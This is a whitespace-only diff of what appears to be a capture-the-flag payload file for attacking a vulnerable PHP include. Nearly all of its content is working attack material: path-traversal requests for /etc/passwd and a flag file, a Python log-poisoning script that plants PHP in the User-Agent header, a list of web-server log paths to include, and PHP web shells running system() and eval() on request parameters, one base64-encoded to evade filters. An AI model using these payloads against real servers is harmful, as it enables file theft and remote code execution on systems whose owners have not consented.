@@ -16,7 +16,7 @@ tricks:
       # Vulnerable code pattern:
       # $file_to_include = $posts_path . $_GET['id'];
       # include($file_to_include);
-      
+
       # Test with path traversal:
       GET /post.php?id=../../../etc/passwd
 
@@ -26,7 +26,7 @@ tricks:
     payload: |
       # If flag is at /FLAG.php and current path is posts/
       # Need to traverse up: ../../../FLAG.php
-      
+
       GET /post.php?id=../../../FLAG.php
 
   - name: "Step 3: Log Poisoning attack"
@@ -35,11 +35,11 @@ tricks:
     payload: |
       # Step 1: Poison the log with PHP code
       import requests
-      
+
       php_payload = "<?php echo file_get_contents('/FLAG.php'); ?>"
       headers = {"User-Agent": php_payload}
       requests.get(target, headers=headers)
-      
+
       # Step 2: Include the poisoned log file
       GET /post.php?id=../../../../var/log/apache2/access.log
 
@@ -51,7 +51,7 @@ tricks:
       /var/log/apache/access.log     # Some distros
       /var/log/httpd/access_log      # RHEL/CentOS
       /var/log/nginx/access.log      # Nginx
-      
+
       # With different traversal depths:
       ../../../var/log/apache2/access.log
       ../../../../var/log/apache2/access.log
@@ -62,13 +62,12 @@ tricks:
     payload: |
       # Read specific file
       <?php echo file_get_contents('/FLAG.php'); ?>
-      
+
       # System command execution
       <?php system($_GET['cmd']); ?>
-      
+
       # Eval for more flexibility
       <?php eval($_GET['c']); ?>
-      
+
       # Base64 encoded to bypass filters
       <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
-
